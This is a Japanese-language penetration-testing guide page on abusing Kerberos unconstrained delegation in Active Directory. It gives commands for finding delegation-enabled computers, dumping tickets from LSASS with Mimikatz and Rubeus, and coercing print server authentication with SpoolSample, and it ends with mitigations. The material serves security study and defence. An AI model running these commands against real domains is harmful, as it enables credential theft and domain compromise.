# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

これは、ドメイン管理者がドメイン内の任意の**コンピュータ**に設定できる機能です。次に、**ユーザーがコンピュータにログイン**するたびに、そのユーザーの**TGTのコピー**がDCによって提供される**TGS内に送信され**、**LSASSのメモリに保存されます**。したがって、マシン上で管理者権限を持っている場合、**チケットをダンプしてユーザーを偽装する**ことができます。

したがって、ドメイン管理者が「Unconstrained Delegation」機能が有効なコンピュータにログインし、そのマシン内でローカル管理者権限を持っている場合、チケットをダンプしてドメイン管理者をどこでも偽装することができます（ドメイン特権昇格）。

この属性を持つコンピュータオブジェクトを**見つけることができます**。これは、[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>)属性が[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)を含んでいるかどうかを確認することで行います。これは、LDAPフィルター‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’を使用して行うことができ、これがpowerviewが行うことです：
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
管理者（または被害者ユーザー）のチケットをメモリにロードします **Mimikatz** または **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
詳細情報: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.teamの非制約デリゲーションに関する詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **強制認証**

攻撃者が「非制約デリゲーション」を許可されたコンピュータを**侵害**することができれば、**Print server**を**自動的にログイン**させて**TGTをメモリに保存**させることができます。\
その後、攻撃者はユーザーPrint serverコンピュータアカウントを**偽装するためにPass the Ticket攻撃を実行**することができます。

印刷サーバーを任意のマシンにログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample)を使用できます:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGTがドメインコントローラーからのものであれば、[**DCSync attack**](acl-persistence-abuse/index.html#dcsync)を実行して、DCからすべてのハッシュを取得することができます。\
[**この攻撃に関する詳細はired.teamで。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

ここに**認証を強制する他の方法があります：**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigation

- DA/Adminのログインを特定のサービスに制限する
- 特権アカウントに対して「アカウントは機密であり、委任できない」を設定する。

{{#include ../../banners/hacktricks-training.md}}
